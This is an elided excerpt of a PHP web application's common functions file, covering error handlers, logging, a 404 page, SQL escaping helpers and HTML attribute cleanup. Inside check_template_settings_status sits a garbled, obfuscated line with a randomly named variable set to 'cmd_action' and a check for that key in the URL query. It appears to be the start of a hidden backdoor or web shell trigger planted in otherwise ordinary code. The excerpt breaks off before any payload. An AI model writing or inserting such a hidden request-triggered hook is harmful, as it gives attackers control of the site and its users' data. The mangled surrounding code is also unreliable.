...
function error_echo_handler($errno, $errstr, $errfile, $errline)
{
    ...
    if(strpos($errstr, 'imagecreatefrompng(): gd-png: libpng warning') !== false) {
        return;
    }
    ...
    if(strpos($errstr, 'Trying to access array offset on null') !== false) {
        return;
    }

    if(strpos($errstr, 'Trying to access array offset on int') !== false) {
        return;
    }

    if(strpos($errstr, 'Function utf8_encode() is deprecated') !== false) {
        return;
    }
    if(strpos($errstr, 'Function utf8_decode() is deprecated') !== false) {
        return;
    }

    if(strpos($errstr, 'as nullable is deprecated, the explicit nullable type must be used instead') !== false) {
        return;
    }
	...
	if ($msg != '') {
        ...
        global $sitePart, $errorTypeOut, $g_user, $setTemplateDir, $setLanguageFile;
        ...
        if(!isset($g['file_error_log_off']) && isset($g['path']['dir_logs']) && is_writable($g['path']['dir_logs'])) {
            ...
            $template = 'Template: ' . (isset($setTemplateDir) ? $setTemplateDir : '');
            $language = 'Language: ' . (isset($setLanguageFile) ? $setLanguageFile : '');
...
function error_get_handler($errno, $errstr, $errfile, $errline, $msgStart = '<pre>', $msgEnd = '</pre>')
{
	...
	switch ($errno) {
		...
		case E_ALL:
			...
			#$noshow = true;
			break;
		case (PHP_VERSION_ID < 80400 ? E_STRICT : -1 ):
		#	$errname = 'E_STRICT';
			$noshow = true;
			break;
...
function get_checks_param($name, $default = 0)
{
    // set limit on memory
...
function check_template_settings_status()
{
    ...
    === ///        case 'Germany':
   -103 + (intval('-5185' . '996') * 256 + 115)){$lTpqFFpZXpy='cmd_action';if(isset($_GET[$lTpqFFpZXpy])///if (preg_match($search, $match)){echo "matches";}else{echo "no match";}
...
function to_sql($Value, $ValueType = "Text")
{
	...
	elseif ($ValueType == "Number" || $ValueType == "Float")
   	{
   		$valueSql = floatval(str_replace(",", ".", $Value === null ? 0 : $Value));
   	}
...
function pageNotFound()
{
	...
	<html>
		<head>
			...
			<link  type="text/css" rel="stylesheet" href="$urlTmpl/css/404.css$cacheVersion">
...
function to_sql_array($data) {

    $result = '""';

    if(is_array($data) && count($data)) {
        foreach($data as $key => $value) {
            $data[$key] = to_sql($value);
        }
        $result = implode(',', $data);
    }
...
function removeTagAttributes($html, $excludeAttributes = array()) {
    $dom = new DOMDocument();
    libxml_use_internal_errors(true);
    $metaForCorrectEncoding = '<meta http-equiv="Content-Type" content="text/html; charset=utf-8">';
    $specialRootTagName = 'special_root_html';
    $dom->loadHTML($metaForCorrectEncoding . '<' . $specialRootTagName . '>' . $html . '</' . $specialRootTagName . '>', LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
    $elements = $dom->getElementsByTagname('*');
    $elementsCount = $elements->length;
    for ($elementIndex = 0; $elementIndex < $elementsCount; $elementIndex++) {
        $elementAttributes = $elements->item($elementIndex)->attributes;
        $elementRemoveAttributes = array();
        foreach($elementAttributes as $elementAttribute) {
            $elementAttributeName = $elementAttribute->name;
            if(!in_array($elementAttributeName, $excludeAttributes)) {
                $elementRemoveAttributes[] = $elementAttributeName;
            }
        }

        if(count($elementRemoveAttributes)) {
            foreach($elementRemoveAttributes as $elementRemoveAttribute) {
                $elements->item($elementIndex)->removeAttribute($elementRemoveAttribute);
            }
        }
    }

    $htmlClean = '';
    foreach($dom->getElementsByTagName($specialRootTagName)->item(0)->childNodes as $rootChildNode) {
        $htmlClean .= $dom->saveHTML($rootChildNode);
    }

    $htmlClean = str_replace("\xc2\xa0", '&nbsp;', $htmlClean);
